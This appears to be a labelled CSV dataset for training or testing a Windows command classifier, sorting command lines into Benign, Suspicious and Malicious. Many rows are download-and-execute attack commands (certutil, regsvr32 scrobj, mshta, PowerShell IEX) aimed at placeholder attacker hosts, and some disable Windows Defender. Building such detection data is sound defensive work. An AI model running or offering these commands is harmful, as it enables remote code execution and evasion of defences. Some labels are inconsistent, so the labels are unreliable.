Prompt,Label,Type
runonce.exe /AlternateShellStartup,Suspicious,command
tracker.exe /d .\file.dll /c write.exe,Suspicious,command
"cmd.exe /c ""@echo open attacker.com 21>ftp.txt&@ftp -s:ftp.txt""",Suspicious,command
explorer.exe /root,Suspicious,command
devtoolslauncher.exe LaunchForDeploy payload.dll,Suspicious,command
print /D:C:\malware.dll:copy.exe C:\file.exe,Suspicious,command
ilasm.exe C:\malicious.txt /exe,Suspicious,command
dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \\10.10.10.10\dll\wtf.dll,Suspicious,command
hh.exe http://domain.com/script.ps1,Suspicious,command
netsh.exe add helper C:\malicious.dll,Suspicious,command
addusers /d users.txt,Benign,command
xcopy C:\logs\. D:\backup\ /E /H /C /I,Benign,command
wsl.exe -e /mnt/c/Windows/System32/calc.exe,Benign,command
ver,Benign,command
robocopy C:\source C:\dest /MIR,Benign,command
arp -a,Benign,command
hostname,Benign,command
date /T,Benign,command
net file,Benign,command
choco list --localonly,Benign,command
type nul > empty.txt,Benign,command
takeown /f C:\temp\*,Benign,command
gpresult /r,Benign,command
attrib +h secret.txt,Benign,command
tzutil /g,Benign,command
"msg * ""Hello""",Benign,command
cls,Benign,command
regsvr32 /i:http://attacker.site/shell.sct scrobj.dll,Malicious,command
"rundll32.exe javascript:""..\mshtml,RunHTMLApplication ""http://attacker/payload.hta""",Malicious,command
"SyncAppvPublishingServer.vbs ""IEX(New-Object Net.WebClient).DownloadString(...)""",Malicious,command
"mshta.exe ""http://evil.site/payload.hta""",Malicious,command
Microsoft.Workflow.Compiler.exe input.xml output.xml,Malicious,command
pubprn.vbs 127.0.0.1 script:https://attacker.site/payload.sct,Malicious,command
ieexec.exe http://malicious.ip:8080/bypass.exe,Malicious,command
MpCmdRun.exe -DownloadFile -url https://attacker.site/beacon.exe -path C:\temp\bacon.exe,Malicious,command
msbuild.exe evil.xml,Malicious,command
AppVLP.exe \\webdav\calc.bat,Malicious,command
dotnet.exe \malicioushost\payload.dll,Malicious,command
powershell -ep bypass -nop -w hidden -c IEX(iwr('http://bad.site')),Malicious,command
"rundll32.exe shdocvw.dll,OpenURL http://attacker/payload.html",Malicious,command
DataSvcUtil /out:C:\calc.exe /uri:http://bad.ip/inject,Malicious,command
psexec \target cmd /c powershell -ep bypass -enc SQB...,Malicious,command
replace.exe \evilhost\backdoor.exe c:\windows /A,Malicious,command
"rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 evil.inf",Malicious,command
extrac32 \remote\evil.cab c:\out\payload.dll,Malicious,command
"rundll32.exe advpack.dll,LaunchINFSection evil.inf",Malicious,command
xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},Malicious,command
set comspec=c:\windows\system32\calc.exe & cscript manage-bde.wsf,Suspicious,command
rundll32 C:\ads\file.txt:ADSDLL.dll,Suspicious,command
reg.exe load HKLM\HACKED hive.dat,Suspicious,command
taskschd.msc /s,Suspicious,command
"cmd /c powershell -command ""Invoke-WebRequest ... -OutFile evil.ps1""",Suspicious,command
xwizard RunWizard {CLSID} /zhttps://10.10.10.10/payload,Suspicious,command
ftp -s:upload.txt,Suspicious,command
powershell -ep remotesigned -file C:\update.ps1,Suspicious,command
cmstp.exe /ni /s \malhost\payload.inf,Suspicious,command
ilasm.exe /exe C:\temp\payload.il,Suspicious,command
"explorer.exe /select,calc.exe",Suspicious,command
hh.exe calc.exe,Suspicious,command
rasautou -d evil.dll -p run -a a -e e,Suspicious,command
netsh wlan show profile,Benign,command
control userpasswords2,Benign,command
powershell Get-Service,Benign,command
ping localhost,Benign,command
cls,Benign,command
choco upgrade all -y,Benign,command
powershell Get-EventLog -LogName Application -Newest 10,Benign,command
net user Administrator,Benign,command
runas /user:Administrator cmd,Benign,command
sfc /scannow,Benign,command
sc config wuauserv start= demand,Benign,command
driverquery,Benign,command
echo %USERNAME%,Benign,command
start calc.exe,Benign,command
taskkill /im explorer.exe /f,Benign,command
"mkdir ""C:\New Folder""",Benign,command
"rmdir ""C:\Old Folder"" /s /q",Benign,command
powershell -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXA...,Malicious,command
"rundll32.exe pcwutl.dll,LaunchInfSection malware.inf",Malicious,command
certutil -decode malicious.b64 payload.exe,Malicious,command
extrac32 /Y /C \\webdav\evil.bat C:\folder\evil.bat,Malicious,command
ftp -n -s:commands.txt,Malicious,command
certreq -Post -config https://malicious.org/ config.ini,Malicious,command
"rundll32 url.dll,FileProtocolHandler http://malware.site/hack.exe",Malicious,command
expand \\evilserver\file.bat C:\ADS\file.txt:file.bat,Malicious,command
configsecuritypolicy.exe C:\calc.exe https://malicious.url/trigger,Malicious,command
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://bad.site/payload,Malicious,command
Msbuild.exe \host.domain\script.xml,Malicious,command
powershell IEX (New-Object Net.WebClient).DownloadString('http://attacker.com'),Malicious,command
replace.exe C:\Source\evil.exe C:\Destination /A,Malicious,command
dnscmd /config /serverlevelplugindll \\11.11.11.11\dll\evil.dll,Malicious,command
"rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 bad.inf",Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL http://attack.site/bad.exe",Malicious,command
"rundll32 advpack.dll,LaunchINFSection DefaultInstall 132 evil.inf",Malicious,command
"mshta.exe vbscript:Execute(""GetObject(""""script:https://evil/payload.sct"""")"")",Malicious,command
ilasm.exe payload.il /exe,Malicious,command
MpCmdRun.exe -DownloadFile -url https://bad.site/mal.exe -path C:\out\mal.exe,Malicious,command
print /D:C:\evil.exe:payload.exe C:\evil.exe,Suspicious,command
cmd.exe /c echo regsvr32 /u evil.ocx,Suspicious,command
taskschd.msc /s,Suspicious,command
"pcalua.exe -a mshta.exe -argumentlist ""http://10.10.10.10/bad.hta""",Suspicious,command
"rundll32 shdocvw.dll,OpenURL calc.exe",Suspicious,command
rasautou -d run.dll -p start -a a -e e,Suspicious,command
pubprn.vbs 127.0.0.1 script:http://domain.com/file.sct,Suspicious,command
msconfig.exe /5,Suspicious,command
"powershell (New-Object System.Net.WebClient).DownloadFile(""http://192.168.0.10/evil.ps1"")",Suspicious,command
bitsadmin /SetNotifyCmdLine 1 cmd.exe NULL,Suspicious,command
explorer.exe C:\Windows\Tasks\payload.txt:backdoor.dll,Suspicious,command
powershell Get-WmiObject Win32_OperatingSystem,Benign,command
net accounts,Benign,command
"findstr /B /C:""OS""",Suspicious,command
systeminfo,Benign,command
"echo ""Welcome to ZHAAN""",Benign,command
dir /s,Benign,command
sc queryex winmgmt,Benign,command
gpupdate /force,Benign,command
powercfg /batteryreport,Benign,command
ipconfig /release,Benign,command
ipconfig /renew,Benign,command
copy /y file.txt file_backup.txt,Benign,command
ren payload.txt payload.bak,Benign,command
compact /u /s /a C:\MyFolder,Benign,command
diskpart,Benign,command
start notepad,Benign,command
net statistics workstation,Benign,command
del /f /q temp.txt,Benign,command
"rundll32.exe ieframe.dll,LaunchHTMLApplication http://bad.site/script.hta",Malicious,command
cmd.exe /c powershell IEX (New-Object Net.WebClient).DownloadString('http://evil.ps1'),Malicious,command
bitsadmin /create job /addfile job http://evil.com/calc.exe c:\data\calc.exe,Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall \evilhost\loader.dll",Malicious,command
"mshta.exe javascript:eval(""window.location='http://malicious/hta';"")",Malicious,command
dnscmd.exe /config /dll \evilhost\backdoor.dll,Malicious,command
ilasm.exe /dll backdoor.il,Malicious,command
configsecuritypolicy.exe calc.exe http://hook.site/tracker,Malicious,command
extrac32.exe /Y /C \remote\badcab.cab C:\payload\payload.dll,Malicious,command
msbuild.exe C:\scripts\backdoor.xml,Malicious,command
powershell Invoke-WebRequest -Uri http://192.168.0.66/payload.ps1 -OutFile malware.ps1,Malicious,command
"rundll32.exe advpack.dll,RegisterOCX exploit.ocx",Malicious,command
psexec \target -u admin -p pass cmd.exe /c calc.exe,Malicious,command
certutil.exe -urlcache -split -f http://malicious.url/dropper.exe dropper.exe,Malicious,command
regsvr32 /s /u /i:https://badhost.net/mal.sct scrobj.dll,Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL http://malicious.ip/drop.exe",Malicious,command
"wmic process call create ""powershell.exe -nop -enc ...""",Malicious,command
"SyncAppvPublishingServer.exe ""(New-Object Net.WebClient).DownloadFile(...)""",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://192.168.1.100/backdoor.hta",Malicious,command
makecab C:\payload.exe C:\archive\hidden.cab,Malicious,command
sc stop antivirus,Suspicious,command
reg delete HKCU\Software\Policies\Microsoft\Windows Defender /f,Suspicious,command
cmd /c @echo off & set path=c:\malicious & start script.bat,Suspicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 config.inf",Suspicious,command
print /D:C:\ADS\copy.exe C:\ADS\malicious.exe,Suspicious,command
"forfiles /p C:\Windows\System32 /m notepad.exe /c ""cmd /c start calc.exe""",Suspicious,command
powershell Start-Process http://malhost/b.exe,Suspicious,command
msconfig,Suspicious,command
taskkill /f /im explorer.exe,Suspicious,command
explorer.exe /root,Suspicious,command
net use \host\share,Suspicious,command
certutil -encode payload.exe payload.b64,Suspicious,command
whoami,Benign,command
ipconfig /flushdns,Benign,command
ping 8.8.8.8,Benign,command
shutdown /r /t 60,Benign,command
notepad readme.txt,Benign,command
echo Hello > welcome.txt,Benign,command
copy welcome.txt \backup\,Benign,command
del /q /f welcome.txt,Benign,command
move test.txt archive\,Benign,command
md reports\2025,Benign,command
start control.exe,Benign,command
chkdsk C:,Benign,command
net config workstation,Benign,command
netstat -rn,Benign,command
date /t,Benign,command
set PATH,Benign,command
title ZHAAN CLI,Benign,command
"rundll32 url.dll,OpenURL http://malicious.ip/invoke",Malicious,command
powershell -nop -ep bypass -enc SQByAHUAbg...,Malicious,command
psexec \10.10.10.10 -u user -p pass powershell.exe -enc JABwAH...,Malicious,command
certutil.exe -decode encoded.b64 payload.exe,Malicious,command
"mshta ""vbscript:CreateObject(""Wscript.Shell"").Run(""cmd.exe"")""",Malicious,command
bitsadmin /create /addfile 1 http://evil.com/file.exe c:\data\file.exe bitsadmin /resume 1,Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL https://attack.site",Malicious,command
makecab \attacker\evil.exe C:\temp\backdoor.cab,Malicious,command
"rundll32 shdocvw.dll,OpenURL http://10.10.10.10/hack",Malicious,command
msbuild.exe C:\malicious\backdoor.xml,Malicious,command
"powershell -Command ""& {IEX (New-Object Net.WebClient).DownloadString('http://a.com')}""",Malicious,command
"SyncAppvPublishingServer.vbs ""IEX((New-Object Net.WebClient).DownloadString(...))""",Malicious,command
"rundll32.exe syssetup.dll,SetupInfObjectInstallAction SetupInstall 128 evil.inf",Malicious,command
MpCmdRun.exe -DownloadFile -url http://badhost.net/inject.exe -path C:\Users\Public\app.exe,Malicious,command
regsvcs.exe \networkshare\malicious.dll,Malicious,command
HH.exe http://attacker.com/shell.ps1,Malicious,command
regsvr32 /u /s /i:http://remote.site/file.sct scrobj.dll,Malicious,command
"rundll32 advpack.dll,RegisterOCX malware.ocx",Malicious,command
"mshta.exe vbscript:Execute(""GetObject(""script:http://evil/sct\"")"")",Malicious,command
ilasm.exe trojan.il /dll,Malicious,command
explorer.exe C:\windows\system32\calc.exe,Suspicious,command
reg import policy.reg,Suspicious,command
rasautou -d dll.dll -p payload -a a -e e,Suspicious,command
"forfiles /p C:\ /m *.exe /c ""cmd /c start %1""",Suspicious,command
taskkill /f /im svchost.exe,Suspicious,command
wscript.exe c:\hidden\script.vbs,Suspicious,command
cmstp.exe /ni /s \network\connect.inf,Suspicious,command
powershell -w hidden -file setup.ps1,Suspicious,command
print /D:C:\ADS\payload.exe:file.exe C:\ADS\payload.exe,Suspicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 malicious.inf",Suspicious,command
net use x: \host\share /user:user pass,Suspicious,command
whoami /user,Benign,command
ping -n 4 localhost,Benign,command
ipconfig /displaydns,Benign,command
tree,Benign,command
fsutil fsinfo drives,Benign,command
powershell Get-ChildItem -Path C:\,Benign,command
net time,Benign,command
"start """" ""C:\Program Files\Google\Chrome\Application\chrome.exe""",Benign,command
rmdir /s /q C:\Temp,Benign,command
shutdown /l,Benign,command
ver,Benign,command
setlocal,Benign,command
endlocal,Benign,command
echo %COMPUTERNAME%,Benign,command
title ZHAAN Rule-Based CLI,Benign,command
start cmd,Benign,command
powershell Get-Date,Benign,command
certutil -urlcache -split -f http://malware.site/drop.exe drop.exe,Malicious,command
"rundll32.exe ieadvpack.dll,RegisterOCX evil.ocx",Malicious,command
powershell IEX (New-Object Net.WebClient).DownloadString('http://payload.ps1'),Malicious,command
configsecuritypolicy.exe C:\Windows\System32\calc.exe http://10.0.0.1/payload,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://evil.com/mal.hta",Malicious,command
"wmic process call create ""powershell.exe -nop -enc JAB...==""",Malicious,command
bitsadmin /create job && bitsadmin /addfile job http://bad.host/file.exe C:\temp\file.exe,Malicious,command
"rundll32 zipfldr.dll,RouteTheCall http://malicious/payload.dll",Malicious,command
msbuild.exe \evilhost\task.xml,Malicious,command
MpCmdRun.exe -DownloadFile -url http://attacker.com/loader.exe -path C:\temp\payload.exe,Malicious,command
regsvr32 /s /n /u /i:http://evil.net/file.sct scrobj.dll,Malicious,command
makecab \attacker\tool.exe C:\output\tool.cab,Malicious,command
xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttp://evil.site/script.hta,Malicious,command
extrac32.exe /Y /C \malicioushost\evil.cab C:\drop\bad.exe,Malicious,command
"rundll32 advpack.dll,RegisterOCX backdoor.ocx",Malicious,command
"mshta.exe vbscript:Execute(""GetObject(""script:https://host/payload.sct\"")"")",Malicious,command
"powershell -nop -w hidden -c ""IEX (iwr('http://malicious'))""",Malicious,command
"rundll32 setupapi.dll,InstallHinfSection DefaultInstall 132 loader.inf",Malicious,command
dotnet.exe payload.dll,Malicious,command
installutil.exe /logfile= /U payload.dll,Malicious,command
"rundll32.exe shell32.dll,ShellExec_RunDLL notepad.exe",Suspicious,command
reg load HKLM\NEWKEY backup.reg,Suspicious,command
cmd /c echo ^<script^>window.location='http://evil';^</script^>,Suspicious,command
print /D:C:\evil.exe:copy.exe copy.exe,Suspicious,command
"explorer.exe /select,C:\Windows\System32\cmd.exe",Suspicious,command
taskkill /f /im powershell.exe,Suspicious,command
bitsadmin /reset,Suspicious,command
ftp -i -n -s:upload_script.txt,Suspicious,command
powershell Get-ItemProperty HKCU:\Software\Microsoft\Windows,Suspicious,command
cmstp.exe /ni /s bad.inf,Suspicious,command
"forfiles /m *.exe /c ""cmd /c attrib -s -h @file""",Suspicious,command
net use y: \malhost\payload,Suspicious,command
hostname,Benign,command
ping -4 example.com,Benign,command
ipconfig,Benign,command
date /t,Benign,command
netstat -an,Benign,command
tasklist,Benign,command
net localgroup,Benign,command
copy config.sys config_backup.sys,Benign,command
echo ZHAAN secure,Benign,command
start write.exe,Benign,command
"Where-Object {$_.Status -eq ""Running""}",Suspicious,command
powershell Get-Service,Benign,command
set USERNAME,Benign,command
start explorer.exe,Benign,command
del *.log,Benign,command
"runas /user:admin ""cmd.exe""",Benign,command
title ZHAAN Security Shell,Benign,command
certutil -urlcache -split -f http://malicious.site/backdoor.exe backdoor.exe,Malicious,command
"rundll32 url.dll,OpenURL http://attacker.com/invoke",Malicious,command
powershell -w hidden -nop -enc SQBlAG8A...,Malicious,command
"mshta vbscript:Execute(""GetObject(""script:http://evil.net/file.sct\"")"")",Malicious,command
MpCmdRun.exe -DownloadFile -url https://evil.net/dropper.exe -path C:\temp\dropper.exe,Malicious,command
msbuild.exe payload.xml,Malicious,command
"wmic process call create ""cmd.exe /c powershell -enc JAB...==""",Malicious,command
regsvr32 /s /n /u /i:http://evil.net/backdoor.sct scrobj.dll,Malicious,command
"SyncAppvPublishingServer.vbs ""IEX(New-Object Net.WebClient).DownloadString(...))""",Malicious,command
makecab \10.0.0.1\payload.exe C:\archive\payload.cab,Malicious,command
"rundll32 advpack.dll,RegisterOCX payload.ocx",Malicious,command
DataSvcUtil /out:C:\calc.exe /uri:http://10.10.10.10/inject,Malicious,command
"rundll32.exe zipfldr.dll,RouteTheCall bad.dll",Malicious,command
"powershell -ep bypass -Command ""IEX (New-Object Net.WebClient).DownloadString('http://...')""",Malicious,command
AppVLP.exe \webdav\payload.bat,Malicious,command
dotnet.exe payload.dll,Malicious,command
installutil.exe /logfile= /U malware.dll,Malicious,command
"rundll32 setupapi.dll,InstallHinfSection DefaultInstall 132 malicious.inf",Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication http://evil.com/hta",Malicious,command
configsecuritypolicy.exe C:\Windows\System32\calc.exe http://attacker/hook,Malicious,command
"rundll32.exe shdocvw.dll,OpenURL http://10.10.10.10/hook",Malicious,command
pubprn.vbs 127.0.0.1 script:http://domain.com/payload.sct,Malicious,command
regsvcs.exe backdoor.dll,Malicious,command
regsvr32 /u /i:http://badhost/file.sct scrobj.dll,Malicious,command
makecab \malicious.net\payload.exe C:\cab\payload.cab,Malicious,command
"rundll32 advpack.dll,LaunchINFSection default.inf",Malicious,command
HH.exe http://attacker.com/script.ps1,Malicious,command
"powershell -nop -w hidden -c ""IEX (iwr('http://bad'))""",Malicious,command
"rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 132 payload.inf",Malicious,command
diantz.exe \attacker\evil.exe C:\out\payload.cab,Malicious,command
extrac32.exe /Y /C \evilserver\payload.cab C:\data\evil.dll,Malicious,command
cmd.exe /c echo regsvr32.exe /i:http://host/file.sct scrobj.dll > evil.bat,Malicious,command
"msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""payload.bat""",Malicious,command
powershell IEX (New-Object Net.WebClient).DownloadString('http://bad'),Malicious,command
"rundll32 shell32.dll,ShellExec_RunDLL http://mal.site/start",Malicious,command
certreq -Post -config https://attacker.com/ evil.ini,Malicious,command
wscript.exe C:\temp\evil.vbs,Malicious,command
"rundll32.exe Mshtml.dll,RunHTMLApplication javascript:alert('pwned')",Malicious,command
replace.exe \evilhost\malware.exe C:\dest /A,Malicious,command
taskschd.msc /s,Suspicious,command
"explorer.exe /select,C:\Windows\System32\cmd.exe",Suspicious,command
net use x: \host\payload,Suspicious,command
print /D:C:\ADS\evil.exe:file.exe C:\ADS\evil.exe,Suspicious,command
cmstp.exe /ni /s bad.inf,Suspicious,command
"forfiles /m *.exe /c ""cmd /c attrib -s -h @file""",Suspicious,command
powershell Start-Process http://attacker/b.exe,Suspicious,command
sc stop WinDefend,Suspicious,command
reg delete HKCU\Software\Microsoft\Windows Defender /f,Suspicious,command
"pcalua.exe -a mshta.exe -argumentlist ""http://host/bad.hta""",Suspicious,command
rasautou -d evil.dll -p run -a a -e e,Suspicious,command
xwizard RunWizard {CLSID} /zhttp://host/script,Suspicious,command
reg load HKLM\INJECT hive.dat,Suspicious,command
cmd /c start \host\malware.exe,Suspicious,command
powershell -file update.ps1,Suspicious,command
bitsadmin /SetNotifyCmdLine 1 cmd.exe NULL,Suspicious,command
"runas /user:admin ""C:\temp\update.exe""",Suspicious,command
whoami,Benign,command
ping 1.1.1.1,Benign,command
ipconfig,Benign,command
echo Hello,Benign,command
dir,Benign,command
hostname,Benign,command
date /t,Benign,command
netstat -ano,Benign,command
powershell Get-Service,Benign,command
chkdsk /f,Benign,command
notepad.exe,Benign,command
shutdown /l,Benign,command
set,Benign,command
tasklist,Benign,command
type readme.txt,Benign,command
del /q /f *.tmp,Benign,command
mkdir C:\Reports,Benign,command
copy config.ini backup_config.ini,Benign,command
net user,Benign,command
fsutil fsinfo drives,Benign,command
"start """" ""C:\Program Files\Google\Chrome\Application\chrome.exe""",Benign,command
systeminfo,Benign,command
echo ZHAAN in progress...,Benign,command
certutil -urlcache -split -f http://evil.ip/evil.exe c:\temp\evil.exe,Malicious,command
"rundll32.exe shdocvw.dll,OpenURL http://bad.url",Malicious,command
powershell -nop -ep bypass -enc SQBiAG...,Malicious,command
"mshta ""vbscript:Execute(""GetObject('script:https://evil.host/file.sct')\"")""",Malicious,command
MpCmdRun.exe -DownloadFile -url https://bad.domain/backdoor.exe -path C:\Tools\bad.exe,Malicious,command
msbuild.exe evil.xml,Malicious,command
"wmic process call create ""powershell.exe -w hidden -enc SQB...""",Malicious,command
regsvr32 /s /n /u /i:http://attacker.com/script.sct scrobj.dll,Malicious,command
"SyncAppvPublishingServer.vbs ""IEX((New-Object Net.WebClient).DownloadString(...))""",Malicious,command
makecab \\malhost\payload.exe C:\output\evil.cab,Malicious,command
"rundll32 advpack.dll,RegisterOCX malware.ocx",Malicious,command
